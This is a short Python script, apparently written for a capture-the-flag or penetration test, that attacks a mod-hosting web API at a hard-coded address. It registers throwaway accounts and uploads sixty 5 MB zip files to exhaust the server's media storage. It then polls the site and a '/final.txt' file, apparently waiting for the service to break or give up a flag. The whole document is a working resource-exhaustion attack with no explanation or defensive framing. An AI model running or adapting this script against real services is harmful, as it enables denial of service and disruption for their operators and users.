import sys, io, zipfile, requests, time, random
sys.path.insert(0, ".")
import palforge as pf
BASE="http://144.79.188.39:36310"; pf.BASE=BASE
def fresh():
    u="u%d"%random.randint(10000,99999); pw="pass12345"
    requests.post(f"{BASE}/api/auth/register/", json={"username":u,"password":pw,"full_name":"z"}, timeout=15)
    return pf.login(u,pw), u
# fill /data/media with large files
ok=0
for i in range(60):
    try:
        tok,u=fresh()
        pid=pf.create_platform(tok,"fill%d"%i,name="z"); mid=pf.create_mod(tok,"v%d"%random.randint(0,9999),title="z"); bid=pf.create_build(tok,mid,pid)
        bio=io.BytesIO()
        with zipfile.ZipFile(bio,"w",zipfile.ZIP_STORED) as zf:
            zf.writestr("f.bin", b"A"*(5*1024*1024))  # 5MB stored
        bio.seek(0)
        r=requests.post(f"{BASE}/api/mods/%d/builds/%d/upload/"%(mid,bid),headers={"Authorization":f"Bearer {tok}"},files={"zip_file":("p.zip",bio,"application/zip")},timeout=30)
        if r.status_code==200: ok+=1
        else: print("fill",i,"->",r.status_code); break
    except Exception as e:
        print("fill",i,"ERR",repr(e)); break
print("filled", ok, "x 5MB")
time.sleep(5)
print("monitor...")
for i in range(12):
    time.sleep(10)
    try:
        c=requests.get(f"{BASE}/",timeout=6)
        root=c.status_code
        f=requests.get(f"{BASE}/final.txt",timeout=6)
        fb=f.text[:80]
        print(f" t={i} root={root} final={f.status_code} {fb!r}")
        if f.status_code==200 and "doctype" not in fb.lower():
            break
    except Exception as e:
        print(f" t={i} DOWN {repr(e)[:60]}")
